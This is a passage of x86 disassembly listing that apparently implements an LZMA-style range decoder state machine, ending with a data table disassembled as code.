  406b8b:	b9 00 08 00 00       	mov    $0x800,%ecx
  406b90:	2b cf                	sub    %edi,%ecx
  406b92:	c1 f9 05             	sar    $0x5,%ecx
  406b95:	03 c8                	add    %eax,%ecx
  406b97:	03 db                	add    %ebx,%ebx
  406b99:	66 89 0e             	mov    %cx,(%esi)
  406b9c:	eb 15                	jmp    0x406bb3
  406b9e:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406ba1:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406ba4:	66 8b c8             	mov    %ax,%cx
  406ba7:	8d 5a 01             	lea    0x1(%edx),%ebx
  406baa:	66 c1 e9 05          	shr    $0x5,%cx
  406bae:	2b c1                	sub    %ecx,%eax
  406bb0:	66 89 06             	mov    %ax,(%esi)
  406bb3:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406bba:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406bbd:	73 a1                	jae    0x406b60
  406bbf:	e9 77 ff ff ff       	jmp    0x406b3b
  406bc4:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406bc8:	75 1c                	jne    0x406be6
  406bca:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bcd:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406bd0:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406bd7:	00 00 00 
  406bda:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406be1:	e9 ab 03 00 00       	jmp    0x406f91
  406be6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406be9:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406bf0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406bf3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406bf6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406bf9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406bfc:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406bff:	33 c0                	xor    %eax,%eax
  406c01:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406c05:	0f 9d c0             	setge  %al
  406c08:	48                   	dec    %eax
  406c09:	24 fd                	and    $0xfd,%al
  406c0b:	83 c0 0a             	add    $0xa,%eax
  406c0e:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406c11:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c14:	05 64 06 00 00       	add    $0x664,%eax
  406c19:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406c1c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406c1f:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406c26:	00 00 00 
  406c29:	e9 63 03 00 00       	jmp    0x406f91
  406c2e:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406c32:	75 21                	jne    0x406c55
  406c34:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406c37:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406c3a:	83 c0 0f             	add    $0xf,%eax
  406c3d:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406c44:	00 00 00 
  406c47:	c1 e0 04             	shl    $0x4,%eax
  406c4a:	03 45 b4             	add    -0x4c(%ebp),%eax
  406c4d:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406c50:	e9 3c 03 00 00       	jmp    0x406f91
  406c55:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c58:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406c5b:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406c62:	00 00 00 
  406c65:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406c6c:	e9 20 03 00 00       	jmp    0x406f91
  406c71:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406c75:	0f 85 b1 00 00 00    	jne    0x406d2c
  406c7b:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406c7f:	0f 84 3b 05 00 00    	je     0x4071c0
  406c85:	33 c0                	xor    %eax,%eax
  406c87:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406c8b:	0f 9d c0             	setge  %al
  406c8e:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406c92:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406c95:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406c99:	0f 84 c0 04 00 00    	je     0x40715f
  406c9f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406ca2:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406ca5:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406ca8:	72 03                	jb     0x406cad
  406caa:	03 45 8c             	add    -0x74(%ebp),%eax
  406cad:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406cb0:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406cb3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cb6:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406cb9:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406cbc:	40                   	inc    %eax
  406cbd:	33 d2                	xor    %edx,%edx
  406cbf:	f7 75 8c             	divl   -0x74(%ebp)
  406cc2:	8b 45 98             	mov    -0x68(%ebp),%eax
  406cc5:	ff 45 a0             	incl   -0x60(%ebp)
  406cc8:	ff 45 98             	incl   -0x68(%ebp)
  406ccb:	ff 4d 9c             	decl   -0x64(%ebp)
  406cce:	88 08                	mov    %cl,(%eax)
  406cd0:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406cd3:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  406cda:	00 00 00 
  406cdd:	e9 c7 fa ff ff       	jmp    0x4067a9
  406ce2:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ce6:	75 05                	jne    0x406ced
  406ce8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406ceb:	eb 36                	jmp    0x406d23
  406ced:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cf0:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406cf3:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  406cfa:	00 00 00 
  406cfd:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  406d04:	e9 88 02 00 00       	jmp    0x406f91
  406d09:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406d0d:	75 05                	jne    0x406d14
  406d0f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406d12:	eb 09                	jmp    0x406d1d
  406d14:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406d17:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406d1a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406d1d:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406d20:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406d23:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406d26:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406d29:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  406d2c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d2f:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  406d36:	05 68 0a 00 00       	add    $0xa68,%eax
  406d3b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406d3e:	e9 d9 fe ff ff       	jmp    0x406c1c
  406d43:	33 c0                	xor    %eax,%eax
  406d45:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406d49:	0f 9d c0             	setge  %al
  406d4c:	48                   	dec    %eax
  406d4d:	24 fd                	and    $0xfd,%al
  406d4f:	83 c0 0b             	add    $0xb,%eax
  406d52:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406d55:	e9 9a 01 00 00       	jmp    0x406ef4
  406d5a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406d5d:	83 f8 04             	cmp    $0x4,%eax
  406d60:	7c 03                	jl     0x406d65
  406d62:	6a 03                	push   $0x3
  406d64:	58                   	pop    %eax
  406d65:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d68:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406d6f:	c1 e0 07             	shl    $0x7,%eax
  406d72:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  406d79:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406d80:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406d83:	e9 ce 02 00 00       	jmp    0x407056
  406d88:	83 fb 04             	cmp    $0x4,%ebx
  406d8b:	7c 34                	jl     0x406dc1
  406d8d:	8b cb                	mov    %ebx,%ecx
  406d8f:	8b c3                	mov    %ebx,%eax
  406d91:	d1 f9                	sar    $1,%ecx
  406d93:	83 e0 01             	and    $0x1,%eax
  406d96:	49                   	dec    %ecx
  406d97:	0c 02                	or     $0x2,%al
  406d99:	d3 e0                	shl    %cl,%eax
  406d9b:	83 fb 0e             	cmp    $0xe,%ebx
  406d9e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406da1:	7d 14                	jge    0x406db7
  406da3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406da6:	2b c3                	sub    %ebx,%eax
  406da8:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  406dab:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406db2:	e9 81 00 00 00       	jmp    0x406e38
  406db7:	33 db                	xor    %ebx,%ebx
  406db9:	83 c1 fc             	add    $0xfffffffc,%ecx
  406dbc:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406dbf:	eb 33                	jmp    0x406df4
  406dc1:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406dc4:	e9 28 01 00 00       	jmp    0x406ef1
  406dc9:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406dcd:	0f 84 98 03 00 00    	je     0x40716b
  406dd3:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406dd6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406dd9:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406ddd:	0f b6 09             	movzbl (%ecx),%ecx
  406de0:	ff 4d 94             	decl   -0x6c(%ebp)
  406de3:	c1 e0 08             	shl    $0x8,%eax
  406de6:	0b c1                	or     %ecx,%eax
  406de8:	ff 45 90             	incl   -0x70(%ebp)
  406deb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406dee:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406df1:	ff 4d b8             	decl   -0x48(%ebp)
  406df4:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406df8:	7e 27                	jle    0x406e21
  406dfa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406dfd:	03 db                	add    %ebx,%ebx
  406dff:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406e02:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  406e05:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e08:	72 0c                	jb     0x406e16
  406e0a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e0d:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e10:	83 cb 01             	or     $0x1,%ebx
  406e13:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e16:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406e1d:	73 d2                	jae    0x406df1
  406e1f:	eb a8                	jmp    0x406dc9
  406e21:	c1 e3 04             	shl    $0x4,%ebx
  406e24:	03 c3                	add    %ebx,%eax
  406e26:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  406e2d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406e30:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e33:	05 44 06 00 00       	add    $0x644,%eax
  406e38:	33 db                	xor    %ebx,%ebx
  406e3a:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406e3d:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406e44:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e47:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  406e4a:	eb 28                	jmp    0x406e74
  406e4c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e50:	0f 84 21 03 00 00    	je     0x407177
  406e56:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e59:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e5c:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e60:	0f b6 09             	movzbl (%ecx),%ecx
  406e63:	ff 4d 94             	decl   -0x6c(%ebp)
  406e66:	c1 e0 08             	shl    $0x8,%eax
  406e69:	0b c1                	or     %ecx,%eax
  406e6b:	ff 45 90             	incl   -0x70(%ebp)
  406e6e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e71:	ff 45 b8             	incl   -0x48(%ebp)
  406e74:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e77:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406e7a:	7d 72                	jge    0x406eee
  406e7c:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406e7f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406e82:	c1 ea 0b             	shr    $0xb,%edx
  406e85:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406e88:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406e8b:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406e8e:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e91:	66 8b 06             	mov    (%esi),%ax
  406e94:	0f b7 c8             	movzwl %ax,%ecx
  406e97:	0f af d1             	imul   %ecx,%edx
  406e9a:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  406e9d:	73 17                	jae    0x406eb6
  406e9f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406ea2:	ba 00 08 00 00       	mov    $0x800,%edx
  406ea7:	2b d1                	sub    %ecx,%edx
  406ea9:	c1 fa 05             	sar    $0x5,%edx
  406eac:	03 d0                	add    %eax,%edx
  406eae:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406eb1:	66 89 16             	mov    %dx,(%esi)
  406eb4:	eb 2a                	jmp    0x406ee0
  406eb6:	33 c9                	xor    %ecx,%ecx
  406eb8:	29 55 f0             	sub    %edx,-0x10(%ebp)
  406ebb:	41                   	inc    %ecx
  406ebc:	29 55 f4             	sub    %edx,-0xc(%ebp)
  406ebf:	8b d9                	mov    %ecx,%ebx
  406ec1:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406ec4:	d3 e3                	shl    %cl,%ebx
  406ec6:	8b cb                	mov    %ebx,%ecx
  406ec8:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406ecb:	0b d9                	or     %ecx,%ebx
  406ecd:	66 8b c8             	mov    %ax,%cx
  406ed0:	66 c1 e9 05          	shr    $0x5,%cx
  406ed4:	2b c1                	sub    %ecx,%eax
  406ed6:	47                   	inc    %edi
  406ed7:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406eda:	66 89 06             	mov    %ax,(%esi)
  406edd:	89 7d b0             	mov    %edi,-0x50(%ebp)
  406ee0:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406ee7:	73 88                	jae    0x406e71
  406ee9:	e9 5e ff ff ff       	jmp    0x406e4c
  406eee:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  406ef1:	ff 45 d4             	incl   -0x2c(%ebp)
  406ef4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406ef7:	85 c0                	test   %eax,%eax
  406ef9:	0f 84 84 02 00 00    	je     0x407183
  406eff:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  406f02:	0f 87 b8 02 00 00    	ja     0x4071c0
  406f08:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  406f0c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406f0f:	01 45 a0             	add    %eax,-0x60(%ebp)
  406f12:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406f16:	0f 84 6d 02 00 00    	je     0x407189
  406f1c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406f1f:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406f22:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406f25:	72 03                	jb     0x406f2a
  406f27:	03 45 8c             	add    -0x74(%ebp),%eax
  406f2a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406f2d:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406f30:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406f33:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406f36:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406f39:	40                   	inc    %eax
  406f3a:	33 d2                	xor    %edx,%edx
  406f3c:	f7 75 8c             	divl   -0x74(%ebp)
  406f3f:	8b 45 98             	mov    -0x68(%ebp),%eax
  406f42:	ff 45 98             	incl   -0x68(%ebp)
  406f45:	ff 4d 9c             	decl   -0x64(%ebp)
  406f48:	ff 4d d0             	decl   -0x30(%ebp)
  406f4b:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406f4f:	88 08                	mov    %cl,(%eax)
  406f51:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406f54:	7f bc                	jg     0x406f12
  406f56:	e9 78 fd ff ff       	jmp    0x406cd3
  406f5b:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406f5f:	75 20                	jne    0x406f81
  406f61:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406f64:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406f68:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406f6b:	c1 e0 04             	shl    $0x4,%eax
  406f6e:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406f72:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f75:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  406f7c:	e9 ce 00 00 00       	jmp    0x40704f
  406f81:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406f84:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  406f8b:	00 00 00 
  406f8e:	8d 70 02             	lea    0x2(%eax),%esi
  406f91:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406f94:	66 8b 06             	mov    (%esi),%ax
  406f97:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406f9a:	0f b7 d0             	movzwl %ax,%edx
  406f9d:	c1 e9 0b             	shr    $0xb,%ecx
  406fa0:	0f af ca             	imul   %edx,%ecx
  406fa3:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406fa6:	73 18                	jae    0x406fc0
  406fa8:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406fab:	b9 00 08 00 00       	mov    $0x800,%ecx
  406fb0:	2b ca                	sub    %edx,%ecx
  406fb2:	c1 f9 05             	sar    $0x5,%ecx
  406fb5:	03 c8                	add    %eax,%ecx
  406fb7:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406fbb:	66 89 0e             	mov    %cx,(%esi)
  406fbe:	eb 19                	jmp    0x406fd9
  406fc0:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406fc3:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406fc6:	66 8b c8             	mov    %ax,%cx
  406fc9:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406fd0:	66 c1 e9 05          	shr    $0x5,%cx
  406fd4:	2b c1                	sub    %ecx,%eax
  406fd6:	66 89 06             	mov    %ax,(%esi)
  406fd9:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406fe0:	73 25                	jae    0x407007
  406fe2:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406fe6:	0f 84 a9 01 00 00    	je     0x407195
  406fec:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406fef:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ff2:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406ff6:	0f b6 09             	movzbl (%ecx),%ecx
  406ff9:	ff 4d 94             	decl   -0x6c(%ebp)
  406ffc:	c1 e0 08             	shl    $0x8,%eax
  406fff:	0b c1                	or     %ecx,%eax
  407001:	ff 45 90             	incl   -0x70(%ebp)
  407004:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407007:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  40700d:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  407013:	e9 91 f7 ff ff       	jmp    0x4067a9
  407018:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40701c:	75 1c                	jne    0x40703a
  40701e:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407021:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  407024:	c1 e0 04             	shl    $0x4,%eax
  407027:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  40702e:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  407035:	e9 38 ff ff ff       	jmp    0x406f72
  40703a:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  407041:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  407048:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  40704f:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  407056:	8b 45 c0             	mov    -0x40(%ebp),%eax
  407059:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  407060:	89 45 b8             	mov    %eax,-0x48(%ebp)
  407063:	eb 28                	jmp    0x40708d
  407065:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407069:	0f 84 32 01 00 00    	je     0x4071a1
  40706f:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407072:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407075:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407079:	0f b6 09             	movzbl (%ecx),%ecx
  40707c:	ff 4d 94             	decl   -0x6c(%ebp)
  40707f:	c1 e0 08             	shl    $0x8,%eax
  407082:	0b c1                	or     %ecx,%eax
  407084:	ff 45 90             	incl   -0x70(%ebp)
  407087:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40708a:	ff 4d b8             	decl   -0x48(%ebp)
  40708d:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  407091:	7e 5e                	jle    0x4070f1
  407093:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407096:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407099:	c1 e9 0b             	shr    $0xb,%ecx
  40709c:	8d 14 00             	lea    (%eax,%eax,1),%edx
  40709f:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4070a2:	8d 34 02             	lea    (%edx,%eax,1),%esi
  4070a5:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4070a8:	66 8b 06             	mov    (%esi),%ax
  4070ab:	0f b7 f8             	movzwl %ax,%edi
  4070ae:	0f af cf             	imul   %edi,%ecx
  4070b1:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4070b4:	73 17                	jae    0x4070cd
  4070b6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4070b9:	b9 00 08 00 00       	mov    $0x800,%ecx
  4070be:	2b cf                	sub    %edi,%ecx
  4070c0:	c1 f9 05             	sar    $0x5,%ecx
  4070c3:	03 c8                	add    %eax,%ecx
  4070c5:	d1 65 b0             	shll   $1,-0x50(%ebp)
  4070c8:	66 89 0e             	mov    %cx,(%esi)
  4070cb:	eb 16                	jmp    0x4070e3
  4070cd:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4070d0:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4070d3:	66 8b c8             	mov    %ax,%cx
  4070d6:	66 c1 e9 05          	shr    $0x5,%cx
  4070da:	2b c1                	sub    %ecx,%eax
  4070dc:	42                   	inc    %edx
  4070dd:	66 89 06             	mov    %ax,(%esi)
  4070e0:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4070e3:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4070ea:	73 9e                	jae    0x40708a
  4070ec:	e9 74 ff ff ff       	jmp    0x407065
  4070f1:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4070f4:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  4070f7:	33 c0                	xor    %eax,%eax
  4070f9:	40                   	inc    %eax
  4070fa:	d3 e0                	shl    %cl,%eax
  4070fc:	2b d8                	sub    %eax,%ebx
  4070fe:	8b 45 84             	mov    -0x7c(%ebp),%eax
  407101:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407104:	e9 04 ff ff ff       	jmp    0x40700d
  407109:	01 5d d0             	add    %ebx,-0x30(%ebp)
  40710c:	8b 45 80             	mov    -0x80(%ebp),%eax
  40710f:	e9 f9 fe ff ff       	jmp    0x40700d
  407114:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  40711b:	00 00 00 
  40711e:	e9 88 00 00 00       	jmp    0x4071ab
  407123:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  40712a:	00 00 00 
  40712d:	eb 7c                	jmp    0x4071ab
  40712f:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  407136:	00 00 00 
  407139:	eb 70                	jmp    0x4071ab
  40713b:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  407142:	00 00 00 
  407145:	eb 64                	jmp    0x4071ab
  407147:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  40714e:	00 00 00 
  407151:	eb 58                	jmp    0x4071ab
  407153:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  40715a:	00 00 00 
  40715d:	eb 4c                	jmp    0x4071ab
  40715f:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  407166:	00 00 00 
  407169:	eb 40                	jmp    0x4071ab
  40716b:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  407172:	00 00 00 
  407175:	eb 34                	jmp    0x4071ab
  407177:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  40717e:	00 00 00 
  407181:	eb 28                	jmp    0x4071ab
  407183:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  407187:	eb 22                	jmp    0x4071ab
  407189:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  407190:	00 00 00 
  407193:	eb 16                	jmp    0x4071ab
  407195:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  40719c:	00 00 00 
  40719f:	eb 0a                	jmp    0x4071ab
  4071a1:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  4071a8:	00 00 00 
  4071ab:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  4071b1:	6a 22                	push   $0x22
  4071b3:	59                   	pop    %ecx
  4071b4:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  4071ba:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4071bc:	33 c0                	xor    %eax,%eax
  4071be:	eb 03                	jmp    0x4071c3
  4071c0:	83 c8 ff             	or     $0xffffffff,%eax
  4071c3:	5f                   	pop    %edi
  4071c4:	5e                   	pop    %esi
  4071c5:	5b                   	pop    %ebx
  4071c6:	c9                   	leave
  4071c7:	c3                   	ret
  4071c8:	bf 67 40 00 64       	mov    $0x64004067,%edi
  4071cd:	68 40 00 ff 68       	push   $0x68ff0040
  4071d2:	40                   	inc    %eax
  4071d3:	00 d4                	add    %dl,%ah
  4071d5:	68 40 00 94 6f       	push   $0x6f940040
  4071da:	40                   	inc    %eax
  4071db:	00 e2                	add    %ah,%dl
  4071dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4071de:	40                   	inc    %eax
  4071df:	00 25 69 40 00 c4    	add    %ah,0xc4004069
  4071e5:	6b 40 00 2e          	imul   $0x2e,0x0(%eax),%eax
  4071e9:	6c                   	insb   (%dx),%es:(%edi)
  4071ea:	40                   	inc    %eax
  4071eb:	00 71 6c             	add    %dh,0x6c(%ecx)
  4071ee:	40                   	inc    %eax
  4071ef:	00 e2                	add    %ah,%dl
  4071f1:	6c                   	insb   (%dx),%es:(%edi)
  4071f2:	40                   	inc    %eax
  4071f3:	00 09                	add    %cl,(%ecx)
  4071f5:	6d                   	insl   (%dx),%es:(%edi)
  4071f6:	40                   	inc    %eax
  4071f7:	00 c9                	add    %cl,%cl
  4071f9:	6d                   	insl   (%dx),%es:(%edi)
  4071fa:	40                   	inc    %eax
  4071fb:	00 be 69 40 00 77    	add    %bh,0x77004069(%esi)
  407201:	6a 40                	push   $0x40
  407203:	00 3b                	add    %bh,(%ebx)
  407205:	6b 40 00 4c          	imul   $0x4c,0x0(%eax),%eax
  407209:	6e                   	outsb  %ds:(%esi),(%dx)
  40720a:	40                   	inc    %eax
  40720b:	00 1c 6c             	add    %bl,(%esp,%ebp,2)
  40720e:	40                   	inc    %eax
  40720f:	00 5b 6f             	add    %bl,0x6f(%ebx)
  407212:	40                   	inc    %eax
  407213:	00 18                	add    %bl,(%eax)
  407215:	70 40                	jo     0x407257
  407217:	00 09                	add    %cl,(%ecx)
